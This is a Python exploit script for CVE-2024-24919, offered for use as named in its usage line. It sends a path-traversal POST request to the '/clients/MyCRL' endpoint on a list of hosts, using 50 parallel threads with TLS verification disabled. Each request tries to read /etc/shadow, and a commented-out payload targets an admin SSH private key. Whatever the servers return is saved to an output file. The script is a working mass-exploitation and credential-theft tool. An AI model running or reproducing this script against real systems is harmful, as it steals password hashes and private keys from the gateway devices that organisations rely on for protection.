import requests
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from tqdm import tqdm

# Suppress only the single InsecureRequestWarning from urllib3 needed for this use case
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def send_post_request(host, output_file):
    url = f"https://{host}/clients/MyCRL"
    headers = {
        "Host": host,
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36"
    }
    # data = "aCSHELL/../../../../../../../home/admin/.ssh/id_rsa"
    data = "aCSHELL/../../../../../../../etc/shadow"
    
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200:
            with open(output_file, 'a') as f:
                f.write(f"Host: {host}\n")
                f.write(response.text)
                f.write("\n\n")
            return True
        else:
            return False
    except requests.RequestException:
        return False

def main(file_path, output_file):
    start_time = datetime.now()
    try:
        with open(file_path, 'r') as file:
            hosts = [host.strip() for host in file.readlines() if host.strip()]
        
        with open(output_file, 'a') as f:
            f.write(f"Start time: {start_time}\n\n")
        
        with ThreadPoolExecutor(max_workers=50) as executor:  # Adjust the number of max_workers as needed
            futures = {executor.submit(send_post_request, host, output_file): host for host in hosts}
            
            for future in tqdm(as_completed(futures), total=len(futures), desc="Processing"):
                success = future.result()
        
        finish_time = datetime.now()
        with open(output_file, 'a') as f:
            f.write(f"\nFinish time: {finish_time}\n")
    except FileNotFoundError:
        print(f"The file {file_path} does not exist.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python CVE-2024-24919.py IP.txt output.txt")
    else:
        main(sys.argv[1], sys.argv[2])
